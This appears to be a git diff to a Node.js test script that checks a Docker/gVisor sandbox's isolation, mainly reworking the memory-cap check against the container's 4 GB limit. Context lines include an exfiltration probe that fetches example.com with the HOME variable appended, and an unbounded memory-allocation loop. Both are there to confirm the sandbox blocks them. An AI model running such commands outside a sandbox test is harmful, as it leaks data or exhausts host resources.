@@ -9,7 +9,7 @@ import os from 'node:os';
 import path from 'node:path';
 import { LIMITS, STALE_NETWORK_MS, Sandbox, TASK_LABEL, run } from '../runner/sandbox.mjs';
 import { runTask } from '../runner/run-task.mjs';
-import { FORK_REFUSED, UNREACHED, forkBombVerdict, ipv6Of, pidsCgroup, unreached, watchPids } from './measure.mjs';
+import { FORK_REFUSED, UNREACHED, forkBombVerdict, ipv6Of, memoryCapVerdict, pidsCgroup, sizeBytes, unreached, watchPids } from './measure.mjs';
 
 const results = [];
 const check = (name, pass, detail) => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`); };
@@ -281,16 +281,24 @@ try {
   const exfil = await box.exec(`node -e "fetch('https://example.com/?k=' + process.env.HOME).then(() => process.exit(0), () => process.exit(1))"`, { timeoutMs: 20_000 });
   check('a script cannot send data out (fetch to example.com)', exfil.code !== 0);
 
-  // The loop prints how many MB it holds after each 256 MB block, so the check can tell "killed at the
-  // cap" from "killed by something else". runc's OOM killer gives exit 137; gVisor kills the process
-  // inside its own kernel and docker exec reports other codes, so under runsc the check accepts any
-  // non-zero exit that came before the timeout with the last report at or under the 3 GB cap.
+  // The loop prints how many MB it holds after each 256 MB block, so the check can tell "stopped at the
+  // cap" from "stopped by something else". The cap is LIMITS.memory (4 GB), read back from Docker and,
+  // while the loop runs, from the host cgroup. runc's OOM killer gives exit 137; gVisor stops the
+  // process inside its own kernel and docker exec reports other codes, so under runsc any non-zero exit
+  // before the time limit counts. Either way the loop must have held more than the cap less 512 MB, and
+  // no more than the cap (memoryCapVerdict in test/measure.mjs).
+  const limits = await run('docker', ['inspect', '-f', '{{.HostConfig.Memory}} {{.HostConfig.MemorySwap}}', box.name]);
+  const [dockerMemory, dockerSwap] = limits.stdout.trim().split(' ').map(Number);
+  const watch = await box.watchUsage().catch(() => null);
   const mem = await box.exec(`node -e "const a = []; for (;;) { a.push(Buffer.alloc(256 * 1024 * 1024, 1)); console.log(a.length * 256) }"`, { timeoutMs: 60_000 });
+  const usage = watch ? watch.stop() : null;
   const oom = (await run('docker', ['inspect', '-f', '{{.State.OOMKilled}} {{.State.Running}}', box.name])).stdout.trim();
-  const heldMb = Number(mem.stdout.trim().split('\n').pop()) || 0;
-  const capMb = 3 * 1024;
-  const killed = mem.code === 137 || (runtime === 'runsc' && mem.code !== 0 && !mem.timedOut && heldMb <= capMb);
-  check('memory is capped (allocation loop is killed)', killed, `exit ${mem.code}${mem.timedOut ? ' (timed out)' : ''}, held ${heldMb} MB of the ${capMb} MB cap when it stopped, container ${oom.endsWith('true') ? 'still running' : 'stopped'}`);
+  const memory = memoryCapVerdict({
+    capBytes: sizeBytes(LIMITS.memory), runtime, code: mem.code, timedOut: mem.timedOut, heldMb: Number(mem.stdout.trim().split('\n').pop()) || 0,
+    docker: limits.code === 0 && Number.isFinite(dockerMemory) && Number.isFinite(dockerSwap) ? { memory: dockerMemory, swap: dockerSwap } : null,
+    usage, container: oom.endsWith('true') ? 'still running' : 'stopped',
+  });
+  check('memory is capped (allocation loop is killed)', memory.pass, memory.detail);
 } finally {
   await box.destroy();
 }
